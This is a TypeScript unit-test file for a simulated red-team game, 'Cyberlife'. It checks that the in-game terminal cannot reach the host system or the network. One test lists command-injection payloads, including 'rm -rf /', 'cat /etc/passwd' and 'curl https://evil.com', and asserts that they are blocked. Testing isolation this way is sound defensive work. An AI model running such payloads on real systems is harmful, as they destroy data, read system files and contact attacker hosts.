/**
 * Cyberlife — Milestone 17: Red Team Safety & Isolation Boundary Unit Tests
 *
 * Enforces strict safety boundary requirements:
 * 1. ZERO operating-system command execution or host shell invocation.
 * 2. ZERO network socket openings, external DNS lookups, or live HTTP requests.
 * 3. Terminal command parser strictly tokenizes input; bash metacharacters
 *    (; | && $(..) `..` > <) cannot escape the simulated environment.
 * 4. 100% simulated, in-memory domain state with synthetic RFC 1918 / test targets.
 */

import { describe, it, expect, vi } from 'vitest';
import { createDefaultCommandRegistry, TerminalExecutionContext } from '@/simulation/cyber/terminal';
import { RedTeamEngine } from '@/simulation/cyber/redteam/redTeamEngine';
import { createInitialRedTeamAssessmentState } from '@/simulation/cyber/redteam/scenarioFixtures';

describe('Red Team Simulation Safety Boundary & Isolation', () => {
  const mockContext: TerminalExecutionContext = {
    simulationTime: {
      dateString: 'Monday, Oct 12, 2026',
      timeString: '08:00 AM',
      iso: '2026-10-12T08:00:00.000Z',
      year: 2026,
      month: 10,
      day: 12,
      hour: 8,
      minute: 0,
      second: 0,
      dayOfWeek: 'Monday',
    },
    currentUser: {
      username: 'tade_adebayo',
      displayName: 'Protector',
      role: 'Security Assessor',
      organization: 'Cedarline Services',
    },
    workstation: {
      id: 'ws_cedarline_01',
      hostname: 'cedarline-sec-ws04.corp.local',
      osVersion: 'CyberOS Enterprise v4.2',
      ipAddress: '10.0.4.15',
      subnet: '255.255.255.0',
      status: 'Active (Simulated Intranet)',
      locationId: 'cedarline_interior',
    },
    history: [],
  };

  it('proves target inventory uses only synthetic RFC 1918 / documentation addresses', () => {
    const assessmentState = createInitialRedTeamAssessmentState();
    expect(assessmentState.targets.length).toBeGreaterThan(0);

    for (const target of assessmentState.targets) {
      // Must be RFC 1918 (10.x.x.x, 172.16-31.x.x, 192.168.x.x) or RFC 5737 TEST-NET-2 (198.51.100.x)
      const ip = target.ipAddress;
      const isPrivateOrTest =
        ip.startsWith('10.') ||
        ip.startsWith('192.168.') ||
        ip.startsWith('172.') ||
        ip.startsWith('198.51.100.');

      expect(isPrivateOrTest).toBe(true);
      expect(target.fqdn).toMatch(/\.local$|\.corp|\.net$|\.ng$/);
    }
  });

  it('confirms terminal "redteam" command does not invoke host execution on command injection attempts', () => {
    const registry = createDefaultCommandRegistry();
    const redteamCmd = registry.get('redteam')!;
    expect(redteamCmd).toBeDefined();

    // First accept the RoE in terminal so that the engine proceeds to scope validation
    redteamCmd.execute(['accept'], mockContext);

    // Malicious shell metacharacter injection payloads
    const injectionAttempts = [
      ['run', 'tool-recon-enum', '; rm -rf / ;'],
      ['run', 'tool-recon-enum', 'app-portal-01 | cat /etc/passwd'],
      ['run', 'tool-recon-enum', '$(whoami)'],
      ['run', 'tool-recon-enum', '`id`'],
      ['run', 'tool-recon-enum', 'app-portal-01 && curl https://evil.com'],
      ['run', 'tool-recon-enum', 'app-portal-01 > output.txt'],
    ];

    for (const args of injectionAttempts) {
      const output = redteamCmd.execute(args, mockContext);
      // It should either return error or safely handle as unknown/unauthorized target
      expect(output.stdout.join(' ')).not.toContain('root:x:0:0');
      expect(output.stdout.join(' ')).not.toContain('/bin/bash');
      // The output stays inside the fictional domain
      expect(
        output.stdout.some(
          line =>
            line.includes('DENIED') ||
            line.includes('OUT OF SCOPE') ||
            line.includes('VIOLATION') ||
            line.includes('not registered') ||
            line.includes('Usage:')
        )
      ).toBe(true);
    }
  });

  it('guarantees RedTeamEngine execution does not trigger window.fetch or network sockets', () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch');
    const state = {
      ...createInitialRedTeamAssessmentState(),
      isAcceptedByPlayer: true,
    };

    // Execute multiple tool actions
    RedTeamEngine.executeToolAction(state, {
      targetId: 'app-portal-01',
      toolId: 'tool-recon-enum',
      currentSimTime: 28900,
    });
    RedTeamEngine.executeToolAction(state, {
      targetId: 'filesrv-01',
      toolId: 'tool-config-smb-audit',
      currentSimTime: 29000,
    });
    RedTeamEngine.executeToolAction(state, {
      targetId: 'app-portal-01',
      toolId: 'tool-web-api-idor',
      currentSimTime: 29100,
    });

    // Zero network calls
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
  });

  it('validates that evidence items contain synthetic SHA-256 hashes generated purely in-memory', () => {
    const state = {
      ...createInitialRedTeamAssessmentState(),
      isAcceptedByPlayer: true,
    };

    const action = RedTeamEngine.executeToolAction(state, {
      targetId: 'filesrv-01',
      toolId: 'tool-config-smb-audit',
      currentSimTime: 29000,
    });

    const evidence = action.generatedEvidence!;
    expect(evidence).toBeDefined();
    expect(evidence.hashSha256).toMatch(/^[a-f0-9]{64}$/);
    expect(evidence.artifactSnippet.join('\n')).not.toContain('C:\\Windows\\System32');
    expect(evidence.artifactSnippet.join('\n')).not.toContain('/home/');
  });
});
